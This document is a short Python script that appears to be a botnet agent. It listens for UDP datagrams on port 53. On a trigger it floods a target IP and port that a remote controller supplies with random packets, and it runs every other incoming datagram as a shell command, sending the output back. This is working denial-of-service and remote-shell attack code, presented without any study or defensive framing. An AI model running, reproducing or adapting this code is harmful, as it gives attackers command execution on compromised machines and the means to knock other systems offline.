import socket,sys,time,os,threading,time,subprocess,ssl,random


s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)


global data 
global x


def udpflood(tip,tport,ttime,pcksize,ip,port):
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   message = f"{local_ip} launched UDPFLOOD on {tip} {tport}" 
   s.sendto(message.encode("ascii"),(ip,port))
   packet = random._urandom(pcksize)
   i = 0   
   while i in range(0,ttime):
       try:
         time.sleep(0.1)
         s.sendto(packet,(tip,tport))
         i+=1
         print(ttime)
       except:
         net()       

def net():
  while 1:
   data,x = s.recvfrom(999999)
   ip = x[0]  
   port = (x[1])
   addr = (ip, port)
   if b"\x75\x64\x70" in data:
     try:
       print(data[0],data[1])
       tip = s.recv(99999)
       tport = int(s.recv(99999))
       ttime = int(s.recv(99999))
       pcksize = int(s.recv(99999))
       print(tip,tport)
       udpflood(tip,tport,ttime,pcksize,ip,port)
     except:
       net() 
   else: 
    print(data,x)
    ip = x[0]  
    port = (x[1])
    addr = (ip, port)
    #cmd = subprocess.run(data, shell=True, capture_output=True)
    cmd = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    stdout, stderr =  cmd.communicate()
    output = stdout or stderr
    cmdoutput = (f"{cmd}").strip()
    s.sendto(output, (addr[0], addr[1]))
    #function recusrion/loop
    net()
    

s.bind((local_ip, 53))

two = threading.Thread(target=net)
two.start()
